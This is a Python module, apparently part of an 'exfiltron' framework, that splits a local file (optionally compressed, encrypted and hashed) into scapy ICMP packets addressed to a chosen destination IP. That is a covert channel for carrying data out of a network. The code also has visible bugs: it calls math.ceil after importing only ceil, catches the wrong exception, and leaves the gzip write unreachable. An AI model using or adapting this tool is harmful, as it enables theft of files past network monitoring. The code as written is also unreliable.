"""
* File: imcp.py
* Authors: Andrew Steiner, Thomas Daniels
* Purpose: This is the ICMP module to the exfiltron framework. Its purpose is
        to create the list of packets needed by the send function in exfiltron
        using ICMP as the method of exfiltration.
"""

from scapy.all import*
import os
import sys
from math import ceil

def icmp(destIP, filename, BytesPP, encrypt, integrity, zip):
    """
    args: destinationIP(str), filename(str), BytesPerPacket(int), encrypt (bool)
    return: list of packets
    """
    READ_ONLY = 'rb'
    listOfPackets = []

    # TODO: make sure minICMP size <= BytesPP <= MTU
   
    # size is the number of bytes in the file
    try:
        size=os.stat(filename).st_size
    except LookupError:
        print("Could not find " + filename)
        print("Exiting...")
        sys.exit()
    
    # the number of packets to send should be the size of the
    # file divided by the number of bytes per packet
    numPackets = int(math.ceil(size / float(BytesPP)))
    
    # opening the specified file **needs error handling**
    OFile = open(filename, READ_ONLY)  

    # If we're zipping the file, make OFile point to the newly zipped file
    if(zip):
        try:
            import gzip
        except ImportError:
            print("Could not import gzip")
            print("Exiting...")
            sys.exit()

            # Make the newly zipped file (implict close of the file)
            with gzip.open(filename + ".gz", 'wb', 9) as f:
                f.write(OFile.read())
        
        # Point OFile to the newly zipped file
        OFile = gzip.open(filename + ".gz", READ_ONLY)

    # Encrypt the file
    if(encrypt):
        # Check to make sure Exfiltron's cryptographic module is available
        try:
            import encryption
        except ImportError:
            print("Could not import Exfiltron's cryptographic module")
            print("Exiting...")
            sys.exit()

        # Create the ciphertext
        cipherText = encryption.encrypt(OFile.read())


    # If the user wants to verify the integrity of the file, calculate
    # the hash of the file and send it over as the first packet
    if(integrity):
        # Check to make sure Exfiltron's cryptographic module is available
        try:
            import encryption
        except ImportError:
            print("Could not import Exfiltron's cryptographic module")
            print("Exiting...")
            sys.exit()

        # Make the hash the first packet
        listOfPackets.append(IP(dst=destIP)/ICMP()/encryption.calculate_hash(OFile.read()))


    # Read the specified amount of data from the file, append it to the packet
    # and add the packet to the list of packets to send
    for i in range(numPackets):
        if(encrypt):
            listOfPackets.append(IP(dst=destIP)/ICMP()/cipherText[(i*BytesPP):((i+1)*BytesPP])
        else:
            OFile.seek(i*BytesPP)
            listOfPackets.append(IP(dst=destIP)/ICMP()/OFile.read(BytesPP))

    OFile.close()

    # If we created the zipped file, we want to delete that
    if(zip):
        os.remove(filename + ".gz")

    return listOfPackets
